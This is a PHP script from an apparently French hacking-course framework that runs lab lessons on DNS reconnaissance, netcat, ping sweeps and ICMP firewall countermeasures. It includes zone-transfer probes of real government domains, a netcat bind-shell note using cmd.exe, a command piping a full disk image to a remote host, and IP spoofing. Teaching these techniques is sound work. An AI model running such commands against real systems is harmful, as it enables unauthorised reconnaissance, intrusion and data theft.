<?php

// uname -a && cat /etc/issue




/*
 *
 * $this->net("http://trtpost.wpengine.netdna-cdn.com/files/2014/04/Figure-16-frequency-incident-classification-patterns.jpg");
 * $this->net("www.verizonenterprise.com/DBIR/2014/reports/rp_Verizon-DBIR-2014_en_xg.pdf");
 * http://sebug.net/chart/
 */

class POC extends poc4web{
    var $msf2;
    var $owasp;
    var $xvwa;
    var $dvl;
    var $xp;
    var $fw;
    var $dsl;
    var $voip;
    var $prof;
    var $k2 ;
    
	
		public function __construct() {
		parent::__construct();
		$this->prof = "10.60.10.1";
		$this->owasp = "10.60.10.129";
		$this->msf2 = "10.60.10.130";
		$this->k2 = "10.60.10.131"; // k2  boot2root - root8users 
		$this->watching();
		$sql = "update IP set ip2backdoor=0 where ip2backdoor=1 ;" ;
		$query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
		$this->requette($query);
		$sql = "update IP set ip2root=0 where ip2root=1 ;";
		$query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
		$this->requette($query);
		$this->pause();
		$sql = "select uid_name,from_base64(templateB64_id),from_base64(templateB64_cmd),from_base64(templateB64_shell) FROM LAN ;";
		$query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
		//$this->requette($query);
		$this->pause();
		}
		
		
		
		public function poc4intro(){
			$this->start("Hacking","");
		$this->chapitre("le monde du hacking");
		intro::def_hacker();$this->pause();
		intro::def_pirate();$this->pause();
		intro::culture_hacker();$this->pause();
		intro::cyber_espionnage();$this->pause();
		intro::victimes();$this->pause();
		intro::attack_country_live();$this->pause();
		intro::malware_challenges_hacking();$this->pause();
		intro::graphic_step_all_hacking();$this->pause();
		intro::hosts();intro::labs_hacking();
		$this->notify("END $module");
		}
		
			// #####################################################
		
		
		function poc4discover4host(){
		    
		    
		    $this->gtitre("Discover IPs Targets");
		    
		    
		    
		    
		    $this->titre("Trouver les Cibles -> IPs");
		    $this->question("quel est le service qui s'occupe des adresses IP ?");
		    $this->net("http://www.sudouest.fr/2012/02/22/les-anonymous-veulent-de-bloquer-internet-le-31-mars-prochain-640395-4725.php");
		    $this->question("Les Anonymous veulent couper Internet, comment comptent-ils proceder ?");
		    $this->article("Attaques du 21 et 22 octobre 2002", "Si je demande l'adresse IP du site fr.wikipedia.org, ma requête est envoyée à un serveur racine du DNS, qui va ensuite la diriger vers le serveur DNS pour le domaine de premier niveau .org. Si je sature un serveur racine du DNS, il ne pourra répondre à aucune requête. Si je sature les 13 serveurs racines du DNS, les 13 serveurs ne pourront répondre à aucune requête. En fait, si les 13 serveurs racines du DNS tombaient en panne, plus rien(ou presque) ne fonctionnerait sur le net, mis à part les appels par IP.
		Les 21 et 22 octobre 2002, la racine complète du DNS a été attaquée, c'est-à-dire les 13 serveurs A à M. L'attaque a connu un relatif succès puisque 7 serveurs sur 13 ont cessé de fonctionner.
		Toutefois, l'attaque n'a pas provoqué de grandes perturbations du réseau mondial, ce qui démontre encore une fois la puissance de chacun des serveurs. En fait, l'ensemble des requêtes peut être assuré par un seul serveur selon le PDG de Verisign, qui administre deux DNS root.
		L'attaque a été réalisée selon la méthode DDoS(déni de service). Les pirates ont pu grâce à un parc de machines gigantesque générer un nombre de requêtes deux à trois fois supérieur à la capacité de charge des treize serveurs visés, soit quarante fois le volume habituel des requêtes !
		");
		    $this->net("http://fr.wikipedia.org/wiki/Serveur_racine_du_DNS");
		    $this->pause();
		    $this->article("Les serveurs racines du DNS", "
		Il y a actuellement 13 serveurs racines du DNS dont les noms sont de la forme lettre.root-servers.net où lettre est une lettre comprise entre A et M. Sept de ces serveurs ne sont pas de simples serveurs mais correspondent à plusieurs serveurs répartis dans des lieux géographiques divers.
		Carte : http://www.root-servers.org/
		        
		Certains serveurs racines possèdent également leur propre site Web, que l'on peut consulter
		http://k.root-servers.org/
		http://h.root-servers.org/
		        
		Ces serveurs racines sont configurés dans les serveurs DNS au moyen d'un fichier dont le nom diffère selon le système d'exploitation et la configuration(named.root, named.cache, db.cache, cache.dns...), et dont la version officielle peut être obtenue sur le site FTP de l'InterNIC :
		ftp://ftp.internic.net/domain/named.root
		On y trouve le nom et l'adresse des 13 serveurs racines.
		        
		        
		Le site FTP de l'InterNIC contient également des copies d'autres zones DNS :
		ftp://ftp.internic.net/domain/
		.INT : ftp://ftp.internic.net/domain/int.zone.gz   (permet d'obtenir tous les domaines en .INT)
		.EDU : ftp://ftp.internic.net/domain/edu.zone.gz    (permet d'obtenir tous les domaines en .EDU) .ARPA : ftp://ftp.internic.net/domain/arpa.zone.gz    (zone technique utilisée pour l'adressage)
		.IN-ADDR.ARPA : ftp://ftp.internic.net/domain/inaddr.zone.gz    (zone technique utilisée pour l'adressage)
		ftp://ftp.internic.net/domain/root.zone
		");
		    $this->net("http://k.root-servers.org/");
		    $this->net("http://h.root-servers.org/");
		    $this->pause();
		    $this->titre("13 dns root servers");
		    $this->requette("dig . a +trace");
		    $this->requette("host -t ns . ");
		    $this->pause();
		    
		    /*
		     * rajouter un transfert de zone pour plusieurs domaines exp: sante.gouv.fr
		     * net("http://www.protocols.com/");
		     *
		     * /etc/named.conf
		     * options {
		     * directory "/var/named";
		     * notify no;
		     * allow-transfer{
		     * 192.168.0.0/24;
		     * };
		     * allow-query{
		     * 192.168.0.0/24;
		     * };
		     * };
		     * zone "." {
		     * type hint;
		     * file "root.cache";
		     * };
		     * zone "0.0.127.IN-ADDR.ARPA"{
		     * type master;
		     * file "127.0.0";
		     * };
		     * zone "wanadoo.fr"{
		     * type forward;
		     * forwarders{
		     * 62.161.120.11;
		     * };
		     * };
		     *
		     */
		    
		    $this->ssTitre("quels sont les NS des tld suivants");
		    $this->requette("host -t ns fr. ");
		    $this->requette("host -t ns dz. ");
		    $this->requette("host -t ns uk. ");
		    $this->pause();
		    $this->titre("Hacking DNS");
		    
		    $this->net("http://www.lemondeinformatique.fr/actualites/lire-les-anonymous-veulent-bloquer-les-serveurs-racines-dns-le-31-mars-47842.html");
		    $this->net("http://en.wikipedia.org/wiki/Root_name_server");
		    $this->net("http://www.cert-ist.com/fra/ressources/Publications_ArticlesBulletins/Environnementreseau/dns_root_server_anycast/");
		    $this->net("http://www.root-servers.org/");
		    $this->pause();
		    $this->ssTitre("LES TLD .tld ");
		    $this->requette("dig meteo.fr a +trace");
		    $this->pause();
		    $this->requette("dig meteo.it a +trace");
		    $this->pause();
		    $this->requette("dig meteo.es a +trace");
		    $this->pause();
		    $this->requette("dig meteo.ch a +trace");
		    $this->pause();
		    $this->requette("dig meteo.dz a +trace");
		    $this->pause();
		    $this->net("http://en.wikipedia.org/wiki/List_of_DNS_record_types");
		    $this->article("Useful DNS Request", "\n\t\t\u25cf  A: demande d\u2019une adresse IP de machine <domain.tld>\n\t\t\u25cf  CNAME: demande le nom réel(canonique) pour un alias.\n\t\t\u25cf  PTR: le nom de machine de l\u2019adresse IP\n\t\t\u25cf  MX: les serveurs de mail(envoie) \n\t\t\u25cf  NS: le(s) serveur(s) DNS gestionnaire(s) du domaine  DNS \n\t\t\u25cf  SOA: des informations sur le domaine(« start-of-authority ») \n\t\t\u25cf  HINFO: demande le CPU et l\u2019OS du serveur(optionnel et    dangereux)\n\t\t\u25cf  TXT: informations textuelles sur le domaine \n\t\t\u25cf  Autres informations: MINFO, UINFO, WKS,ANY, AXFR, MB, MD, MF, NULL ");
		    $this->pause();
		    
		    $domain = "juarez.gob.mx";
		    $ns_domain = "ns1.juarez.gob.mx.";
		    
		    $this->titre("Looking For Server DNS for $domain Domain");
		    $this->ssTitre("With DIG");
		    $this->requette("dig $domain ns");
		    $this->requette("dig $domain ns +short");
		    $this->pause();
		    $this->titre("Looking For Mail Server for $domain Domain");
		    $this->article("MX, Mail Exchange", " indique le ou les serveurs de messagerie avec une priorité. Le nombre le plus faible indique le serveur le plus prioritaire.
		        
      dig acbm.com mx
		        
      acbm.com.		1D IN MX		0 mail.acbm.com.
      acbm.com.		1D IN MX		10 h.acbm.com.
		        
      Dans cet exemple, un mail à destination d'une personne d'acbm.com passera par le serveur mail.acbm.com à moins que celui-ci soit en panne auquel cas, le serveur h.acbm.com sera utilisé. ");
		    $this->pause();
		    $this->ssTitre("With DIG");
		    $this->requette("dig $domain mx");
		    $this->requette("dig $domain mx +short");
		    $this->pause();
		    $this->titre("Looking For SOA for $domain Domain");
		    $this->article("SOA, Start Of Authority", " décrit le DNS faisant référence ainsi que différentes valeurs indiquant la durée de validité des informations et l'adresse email du responsable de la zone.
		        
      dig acbm.com soa
		        
      acbm.com.		3H IN SOA		ns1.shimpinomori.net. hostmaster.shimpinomori.net.(
      		2002040701		; serial
      		1D		; refresh
      		1H		; retry
      		1W		; expiry
      		1D)		; minimum
		        
      Dans cet exemple, ns1.shimpinomori.net est le DNS maître pour la zone acbm.com et le responsable est hostmaster@shimpinomori.com. Le caractère @ étant réservé, il est remplacé dans l'email par un point. Par définition, les DNS secondaires sauvegardent les informations de la zone à partir d'un DNS primaire. Ils vérifient tous les jours refresh=1D si une nouvelle version de cette zone est disponible en comparant le serial ou numéro de série avec celui de la zone sauvegardée. En cas d'echec, une nouvelle tentative est faite toutes les heures retry=1H jusqu'à la péremption des informations au bout d'une semaine expiry=1W. Les informations peuvent être conservées dans un cache DNS au moins un jour minimum=1D. ");
		    $this->pause();
		    $this->ssTitre("With DIG");
		    $this->requette("dig juarez.gob.mx txt +short");
		    $this->requette("dig juarez.gob.mx txt ");
		    $this->requette("dig $domain soa");
		    $this->pause();
		    $this->titre("DNS Zone Transfer");
		    $this->article(" DNS est un service critique !", "
    \u2013  Obligation d\u2019avoir au moins deux serveurs DNS
    \u2013  2 machines physiques différentes doivent assurer le DNS
    \u2013  Problème de synchronisation entre serveurs ");
		    $this->pause();
		    $this->note("UDP : Taille maximale des paquets UDP: 512 octets
     TCP :  exceptionnellement si un paquet de 512 octets n\u2019est pas suffisant
TCP n'est pas réservé qu'au transfert de zone et est utilisé si la taille de la réponse est supérieure à la limite d 'un paquet UDP de 512 octets ");
		    $this->pause();
		    $this->net("http://fr.wikipedia.org/wiki/Transfert_de_zone_DNS");
		    $this->net("http://en.wikipedia.org/wiki/DNS_zone_transfer");
		    $this->pause();
		    $this->titre("Transfer entire zone on $ns_domain of $domain Domain");
		    // ssTitre("With HOST");requette("host -l $domain $ns_domain ");pause();
		    // rajouter avec nslookup
		    $this->ssTitre("With DIG");
		    $this->requette("dig @$ns_domain $domain axfr");
		    $this->pause();
		    $this->ssTitre("With DNSENUM");
		    $this->net("http://blog.wirhabenstil.de/2012/08/06/hint-perl-packages-for-dnsenum-pl/");
		    $this->net("http://code.google.com/p/dnsenum/downloads/list");
		    $this->pause();
		    $this->requette("perl $this->dir_tools/hosts/dnsenum-1.2.2/dnsenum.pl $domain");
		    $this->pause();
		    
		    $this->titre("Other exemple of DNS Transfert zone"); // ns2.sante.gouv.fr
		    
		    zone_transfert("dstl.gov.uk");
		    zone_transfert("ssi.gouv.fr");
		    $this->pause();
		    
		    $this->important("Find Serveur de Test");
		    zone_transfert("westlothian.gov.uk");
		    $this->requette("dig sonora.gob.mx txt +short");
		    zone_transfert("sonora.gob.mx");
		    
		    $this->important("des Plage Interne - LAN ");
		    $this->requette("dig hidalgo.gob.mx txt +short");
		    $this->requette("dig hidalgo.gob.mx txt ");
		    zone_transfert("hidalgo.gob.mx");
		    zone_transfert("stcsm.gov.cn");
		    zone_transfert("suzhou.gov.cn");
		    
		    $axfr_list = "$this->dir_tools/hosts/axfr.hosts";
		    $this->requette("gedit $axfr_list");
		    
		    // $hosts_domain = file($axfr_list);
		    // foreach($hosts_domain as $target_domain)
		    // zone_transfert($target_domain);
		        
		        $this->chapitre("Travaux Pratiques");
		        $this->titre("Exemple pour vous aider");
		        search_zone_transfert("gouv.fr", 50);
		        
		        $this->article("TP", "Trouver sur le net des domaines gouvernementaux ou c'est possible de faire un transfert de zone");
		        
		        $this->pause();
		        
		        $this->titre("No DNS Zone Transfer");
		        $this->question("Si le transfert de zone ne donne rien !!! quelle est la suite ? ");
		        
		        search_subdomain("www.bull.com");
		        googleHacking();
		        search_metamoteur();
		        $this->pause();
		        
		        $this->titre("Check if Hosts are online by dns request A");
		        $this->requette("host -t a ad.google.com");
		        $this->requette("host -t a dns.google.com");
		        $this->requette("host -t a www.google.com");
		        $this->requette("host -t a ftp.google.com");
		        $this->pause();
		        $domain = "google.com";
		        $this->requette("gedit $this->dico_word");
		        $this->pause();
		        check_DNS_Potentiel($domain);
		        $this->titre("DNSMAP: optimised software");
		        $this->net("https://code.google.com/p/dnsmap/downloads/list");
		        $this->pause();
		        $this->requette("$this->dir_tools/hosts/dnsmap-0.30/dnsmap google.com -w $this->dir_tools/dico/dnsmap_test.txt ");
		        $this->requette("$this->dir_tools/hosts/dnsmap-0.30/dnsmap yahoo.com -w $this->dir_tools/dico/dnsmap_test.txt ");
		        $this->pause();
		        $this->requette("cat $this->dir_tools/dico/dnsmap_test.txt | parallel -j100 dig +noall {}.$domain +answer");
		        $this->pause();
		        $this->titre("online");
		        $this->net("http://www.dnsstuff.com");
		        $this->pause();
		        
		        $this->notify("END $start_file");
		        // ######################################################
		}
		
		
		public function poc4scan4ip(){
		    $this->chapitre("SCAN aLive Hosts");
		    $this->ssTitre("presentation de netcat");
		    $this->net("http://en.wikipedia.org/wiki/Netcat");
		    $this->net("http://sourceforge.net/projects/nc110/");
		    $this->pause();
		    
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S watch netstat -tpan | grep 5544 ");
		    $this->pause();
		    
		    $this->ssTitre("simple Backdoor With netcat");
		    $this->requette("/bin/nc.traditional -h");
		    virustotal_scan("/bin/nc.traditional");
		    $this->pause();
		    $this->requette("/bin/nc.openbsd -h");
		    virustotal_scan("/bin/nc.openbsd");
		    $this->pause();
		    virustotal_scan("$this->dir_tools/backdoor/nc.exe");
		    $this->pause();
		    
		    $this->ssTitre("connexion TCP avec netcat MODE MSN");
		    $this->cmd($this->msf, "ncat -l 2345 -v");
		    $this->cmd("localhost", "nc $this->msf 2345 -v");
		    $this->pause();
		    $this->cmd($this->xp, "c:/ceh/nc.exe -l 2345 -v -n ");
		    $this->cmd("localhost", "nc $this->xp 2345 -v");
		    $this->pause();
		    
		    
		    $this->ssTitre("port forwarding");
		    
		    /*
		     *
		     * On Linux, NetCat can be used for port forwarding. Below are nine different ways to do port forwarding in NetCat (-c switch not supported though - these work with the 'ncat' incarnation of netcat):
		     *
		     * nc -l -p port1 -c ' nc -l -p port2'
		     * nc -l -p port1 -c ' nc host2 port2'
		     * nc -l -p port1 -c ' nc -u -l -p port2'
		     * nc -l -p port1 -c ' nc -u host2 port2'
		     * nc host1 port1 -c ' nc host2 port2'
		     * nc host1 port1 -c ' nc -u -l -p port2'
		     * nc host1 port1 -c ' nc -u host2 port2'
		     * nc -u -l -p port1 -c ' nc -u -l -p port2'
		     * nc -u -l -p port1 -c ' nc -u host2 port2'
		     */
		    $this->article("TP", "faire une chaine de Host1: nc -lk -p <Port N° x+0> | nc <next Host> <Port N° x+1 >...Hostn: nc -lk -p <Port N° x+n> | nc <next Host> <Port N° x+n+1 >");
		    $this->article("Deroulement", "envoyer une chaine au premier host pour quelle arrive au dernier Host -> passe par tous les HOSTS");
		    $this->pause();
		    
		    
		    $this->ssTitre("Mode Chat");
		    $this->cmd("localhost", "ncat -l 5544 --chat");
		    $this->cmd($this->lts, "ncat $this->prof 5544 -v");
		    $this->cmd($this->xp, "ncat $this->prof 5544 -v");
		    $this->pause();
		    
		    $this->ssTitre("connexion UDP avec netcat MODE MSN");
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S watch netstat -upan");
		    $this->pause();
		    $this->cmd($this->msf, "ncat -l -u 2345 -v");
		    $this->cmd("localhost", "ncat -u $this->msf 2345 -v");
		    $this->pause();
		    $this->cmd($this->xp, "c:/ceh/nc.exe -l -u -p 2345 -v -n ");
		    $this->cmd("localhost", "ncat -u $this->xp 2345 -v");
		    $this->pause();
		    
		    $this->ssTitre("Telnet-like Usage");
		    $this->cmd("localhost", "echo 'help' | nc dict.org 2628");
		    $this->pause();
		    $this->requette("echo -e \"HEAD / HTTP/1.1\nHost: localhost\nUser-Agent: $this->user_agent\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n\" | nc localhost 80 -v");
		    $this->pause();
		    
		    $this->ssTitre("simulate WebServer");
		    $cmd1 = "ncat -lk 8080 -v --sh-exec \"echo -e 'HTTP/1.1 200 OK\r\n'; cat /var/www/html/index.html\"";
		    $cmd2 = "firefox --new-tab \"http://localhost:8080/\" ";
		    $this->exec_parallel($cmd1, $cmd2, 3);
		    $this->pause();
		    
		    $this->ssTitre("Serveur Date");
		    $cmd1 = "ncat -k -l 1234 -v -e /bin/date";
		    $cmd2 = "nc localhost 1234 -v";
		    $this->exec_parallel($cmd1, $cmd2, 5);
		    $this->pause();
		    
		    $this->ssTitre("Transfering Files -> Forensics ");
		    $this->article("pv", " to show a progress indicator.");
		    $this->cmd($this->lts, "nc $this->prof 3333 | pv -b > $this->dir_tmp/backup.iso");
		    $this->cmd("localhost", "cat $this->dir_iso/XPSP2.iso | pv -b | nc -l 3333");
		    $this->article("Usage", "echo '$this->root_passwd' | sudo -S dd if=/dev/sda | gzip -c -v --fast > save.zip");
		    $this->article("usage", "dd if=/dev/sdb | gzip -c | nc remote_server.com 5000");
		    $this->pause();
		    
		    $this->ssTitre("Port Scanner");
		    $this->requette("nc -z -v $this->msf 1-1000 2000-3000");
		    $this->pause();
		    $this->ssTitre("Like Web Server");
		    $this->requette("echo '<html><head><title>Test Page</title></head><body><center><h1>Level 1 header</h1><h2>Subheading</h2><p>Normal text here</p></center></body></html>' > $this->dir_tmp/index.html");
		    $this->cmd("localhost", "nc -l 8888 < $this->dir_tmp/index.html");
		    $this->pause();
		    
		    $this->ssTitre("Persistant: keep listening");
		    $this->cmd("localhost", "while true; do nc -k -l 8888 -v < $this->dir_tmp/index.html; done");
		    $this->cmd("localhost", "nc -k -l 2389 -v");
		    $this->cmd("localhost", "echo 'salut' | nc localhost 2389 -v");
		    $this->pause();
		    $this->net("http://localhost:8888/");
		    $this->pause();
		    
		    $this->ssTitre("to spoof the source IP address");
		    $this->cmd("localhost", "nc -s spoofed_ip remote_host port");
		    $this->pause();
		    
		    $this->ssTitre("Stream Video");
		    $this->cmd("localhost", "cat video.avi | nc -l 1567");
		    $this->cmd("localhost", "nc localhost 1567 | mplayer -vo x11 -cache 3000 -");
		    $this->pause();
		    
		    $this->ssTitre("exec Command");
		    $this->note("The command we want to give on the server looks like this:
		 nc -L -p 10001 -d -e cmd.exe
		 Here's what that command does:
		 nc -tells Windows to run the nc.exe file with the following arguments:
		 -L Tells netcat to not close and wait for connections
		 -p Specifies a port to listen for a connection on
		 -d Tells Netcat to detach from the process we want it to run.
		 -e Tells what program to run once the port is connected");
		    $this->cmd("localhost", "ncat -l 1313 --keep-open --send-only --exec \"/bin/date\"");
		    $this->cmd("localhost", "nc localhost 1313 -v");
		    $this->pause();
		    
		    
		    
		    $this->pause();
		    $ip = '129.185.32.196'; // www.bull.com
		    $this->titre("WHOIS ");
		    $this->net("http://en.wikipedia.org/wiki/File:Regional_Internet_Registries_world_map.svg");
		    $this->net("http://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xml");
		    $this->requette("cat /etc/services | grep 43/tcp | grep whois");
		    $this->requette("gedit /etc/services");
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .COM");
		    $this->requette("whois com -h whois.iana.org");
		    $this->pause();
		    $query = 'whois com -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .DZ");
		    $query = 'whois dz -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .FR");
		    $query = 'whois fr -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .ES");
		    $query = 'whois es -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .IT");
		    $query = 'whois it -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Quel est le Serveur Whois qui s'occuppe du Domaine .UK");
		    $query = 'whois uk -h whois.iana.org | grep whois:';
		    $this->requette($query);
		    $this->pause();
		    $this->titre("Interroge un Serv Whois sur une Cible (siteweb)");
		    $query = 'whois ayrade.com -h whois.verisign-grs.com';
		    $this->requette($query);
		    $this->note("Resultat non fructueux");
		    $this->pause();
		    $query = 'whois ayrade.com -h whois.verisign-grs.com | grep whois. | head -1 ';
		    $this->requette($query);
		    $query = 'whois ayrade.com -h whois.PublicDomainRegistry.com';
		    $this->requette($query);
		    $this->article("localhost", "meme si on a pas de resultat avec whois.verisign-grs.com -> ce dernier nous informe quel serv se trouve l'information qu'on cherche, dans notre cas -> whois.PublicDomainRegistry.com ");
		    $this->pause();
		    
		    ipRange (); // bull.fr
		    
		    $this->todo("faire un script pour verifier l'existance de la base de donnée et installer la base geoip dans le cas echeant ");
		    // geoip('129.185.32.196',$server,$login,$passwd,$base_geoip);
		    $this->notify("END 1 Day");
		    
		    $ip = "193.194.64.0/24";
		    
		    $this->chapitre("Identification in Big Plage IP -> ALIVE HOST ");
		    $this->titre("LIVE HOST- by ICMP -> Ping ");
		    $this->img("hosts/icmp_header_nmap.png");
		    $this->pause();
		    $this->net("http://fr.wikipedia.org/wiki/Internet_Control_Message_Protocol");
		    $this->requette("echo '$this->root_passwd' | sudo -S iptables -F;sudo iptables -X");
		    $this->ssTitre("checking one HOST");
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp ");
		    $this->pause();
		    $this->requette("ping -c 1 $this->xp -q");
		    $this->pause();
		    $this->ssTitre("Multiple HOSTs");
		    ping("10.50.10");
		    $this->pause();
		    pdf("../doc/IPv4_Subnetting.pdf", 0);
		    $this->pause();
		    $this->titre("Ping Sweep");
		    $ip = "193.194.64.0/24"; // TESTER sur le net a cause de ARP (nmap)
		    $this->titre("PING SWEEP -> Plage/Bloc IP");
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp and host $this->prof");
		    $this->pause();
		    $this->requette("echo '$this->root_passwd' | sudo -S nmap -sP -PE -n --reason -vvv $ip -e $this->eth_lan");
		    $this->pause();
		    $this->requette("echo '$this->root_passwd' | sudo -S fping -g $ip");
		    $this->pause();
		    $this->note("parfois le resultat de nmap et fping n'est pas le meme, nmap detecte moins que le fping la cause est que nmap est trop rapide il termine avant qu'il ne recoit la reponse reply d'une machine.\n Pour ralentir, on suit fping lors de l'intervalle voir \n$ fping -gs <network> -> pour avoir une idée du temps de reponse \"--min-rtt-timeout=200ms\" -> apparemment dans cette version de nmap le \"--min-rtt-timeout=200ms\" ne fonctionne pas CHK\n");
		    
		    poc_ip2dns($ip);
		    $this->titre("Broadcast ICMP - ICMP ECHO request to the broadcast address of a network");
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp ");
		    $this->pause();
		    $this->ssTitre("Pinging broadcast address 10.50.10.255");
		    $broadcast_addr = "10.50.10.255";
		    $this->requette("ping -b $broadcast_addr -c3 -q -I $this->eth_lan");
		    $this->pause();
		    $this->note("Only OS Unix|Linux 2.4 reply to ping ");
		    $this->pause();
		    $this->ssTitre("Pinging broadcast address 10.50.10.0");
		    $broadcast_addr = "10.50.10.0";
		    $this->requette("ping -b $broadcast_addr -c3 -q -I $this->eth_lan");
		    $this->pause();
		    $this->note("Only OS Unix|Linux 2.4 reply to ping ");
		    $this->pause();
		    $this->article("Enable ICMP broadcast in Linux For > 2.4 Kernel ", "echo '0' > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts");
		    $this->requette("cat /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts");
		    $this->requette("echo '0' | sudo tee  /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts");
		    $this->pause();
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp");
		    $this->pause();
		    ssh($this->msf, "root", "rohff", "ping -b 10.50.10.255 -c3 -q");
		    ssh($this->msf, "root", "rohff", "ping -b 10.50.10.255 -c3 -q");
		    $this->pause();
		    ssh($this->msf, "root", "rohff", "ping -b 10.50.10.0 -c3 -q");
		    $this->pause();
		    $this->ssTitre("Disable ICMP broadcast");
		    $this->requette("echo '1' | sudo tee  /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts");
		    $this->pause();
		    
		    
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp ");
		    $this->pause();
		    $this->net("http:nmap.org/book/nping-man-icmp-mode.html");
		    $this->pause();
		    icmpECHO($this->msf);
		    $this->note("Sometimes we meed to let ICMP protocol for monitoring software or other tools we need ");
		    $this->requette("grep -in ICMP /etc/snort/rules/*.rules | egrep -i \"software|monitor\" ");
		    $this->pause();
		    icmpTIME($this->msf);
		    icmpINFO($this->msf);
		    $this->article("Hping3", "Type 15 -> Unsupported icmp type (sudo hping3 -I $this->eth_lan -c 1 --icmptype 15) ");
		    $this->note("Windows 7 and Windows Server 2008 don't reply with ICMP itype:16 but by ICMP itype:3 (Destination unreachable) with icode:2 (Protocol unreachable) -> see Wireshark ");
		    $this->pause();
		    icmpMASK($this->msf);
		    
		    $this->titre("How Scan ICMP nmap Works ?");
		    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tshark -i $this->eth_lan -n icmp and host 8.8.8.8");
		    $this->pause();
		    $this->requette("echo '$this->root_passwd' | sudo -S nmap -sP 8.8.8.8 -vvv -n --reason");
		    $this->pause();
		    
		    
		    $this->ssTitre("Scanner Internet");
		    $this->net("https://zmap.io/");
		    $this->pause();
		    
		    system("echo '$this->root_passwd' | sudo -S iptables -F");
		    $this->chapitre("Countermeasure Scan ICMP ");
		    $this->requette("grep -in ICMP /etc/snort/rules/icmp-info.rules");
		    $this->pause();
		    $this->titre("Countermeasure ICMP ECHO");
		    $this->chapitre("in Firewall Level");
		    $this->ssTitre("On Linux OS");
		    $this->article("Countermeasure ICMP ECHO", "Block ICMP echo Requests coming from the Internet on the border Router and/or Firewall.");
		    $this->article("Before", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I lo -c 1 --icmptype 8 localhost  ");
		    $this->requette("echo '$this->root_passwd' | sudo -S iptables -I INPUT -d localhost -p icmp --icmp-type echo-request -j DROP;sudo iptables -L -n -v;");
		    $this->article("After", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I lo -c 1 --icmptype 8 localhost  ");
		    $this->pause();
		    $this->article("Countermeasure ICMP Time Stamp", "Block ICMP Time Stamp Requests coming from the Internet on the border Router and/or Firewall.");
		    $this->article("Before", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I lo -c 1 --icmptype 13 localhost  ");
		    $this->requette("echo '$this->root_passwd' | sudo -S iptables -I INPUT -d localhost -p icmp --icmp-type timestamp-request -j DROP;sudo iptables -L -n -v;");
		    $this->article("After", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I lo -c 1 --icmptype 13 localhost  ");
		    $this->pause();
		    $this->article("Countermeasure ICMP Information", "Block outgoing ICMP Information coming from the protected network to the Internet on your Firewall and/or Border Router. If you are using a firewall check that your firewall block protocols which are not supported (deny all stance).");
		    $this->article("Before", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S icmpush -vv  -info localhost  ");
		    $this->requette("echo '$this->root_passwd' | sudo -S iptables -I INPUT -d localhost -p icmp --icmp-type 15 -j DROP;sudo iptables -L -n -v;");
		    $this->article("After", "Droping by Iptables");
		    $this->requette("echo '$this->root_passwd' | sudo -S icmpush -vv  -info localhost  ");
		    $this->pause();
		    $this->requette("echo '$this->root_passwd' | sudo -S iptables -L -nv");
		    $this->pause();
		    system("echo '$this->root_passwd' | sudo -S iptables -F");
		    $this->ssTitre("On Windows OS");
		    $this->article("Before", "Droping by Windows Firewall");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 8 $this->xp");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 13 $this->xp");
		    $this->requette("echo '$this->root_passwd' | sudo -S icmpush -vv  -info $this->xp");
		    $this->cmd("rohff:hacker@$this->xp", "netsh firewall set opmode enable");
		    $this->pause();
		    $this->article("After", "Droping by Windows Firewall");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 8 $this->xp  ");
		    $this->requette("echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 13 $this->xp");
		    $this->requette("echo '$this->root_passwd' | sudo -S icmpush -vv  -info $this->xp");
		    $this->pause();
		    $this->cmd("rohff:hacker@$this->xp", "netsh firewall set opmode disable");
		    $this->pause();
		    
		    
		    
		    $this->chapitre("in IDS/IPS Level");
		    $this->net("http://rules.emergingthreats.net/open-nogpl/");
